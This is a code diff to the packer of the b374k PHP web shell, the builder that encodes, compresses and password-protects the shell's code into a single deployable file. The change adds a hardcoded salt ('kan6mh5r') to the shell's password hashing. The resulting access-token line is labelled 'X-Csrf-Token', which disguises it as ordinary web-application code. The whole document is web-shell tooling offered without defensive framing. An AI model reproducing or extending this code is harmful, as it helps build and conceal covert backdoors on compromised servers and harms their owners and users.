@@ -433,7 +433,7 @@ else{
 		$base_code .= packer_read_file($GLOBALS['packer']['base_dir']."main.php");
 		$phpcode = "<?php \$GLOBALS['encode']='{$encode}';".trim($module_init)."?>".trim($base_code).trim($module_code);
 
-		$res = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password);
+		$res = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password, isset($opt['d']) ? 'kan6mh5r' : null);
 		$status = explode("{[|b374k|]}", $res);
 		$output .= "Result\t\t\t: ".strip_tags($status[0])."\n\n";
 	}
@@ -562,13 +562,13 @@ function packer_pack_js($str){
 	return $packer->pack();
 }
 
-function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password){
+function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password, $salt=null){
 	$content = "";
 	if(is_file($output)){
 		if(!is_writable($output)) return "error : file ".$output." exists and is not writable{[|b374k|]}";
 	}
 
-	if(!empty($password)) $password = "\$GLOBALS['token'] = \"".cryptMyMd5($password)."\"; // X-Csrf-Token\n";
+	if(!empty($password)) $password = "\$GLOBALS['token'] = \"".cryptMyMd5($password, $salt)."\"; // X-Csrf-Token\n";
 	$cipher_key = "\$GLOBALS['cipher_key'] = \"" . $GLOBALS['cipher_key'] . "\";";
 
 	$compress_level = (int) $compress_level;
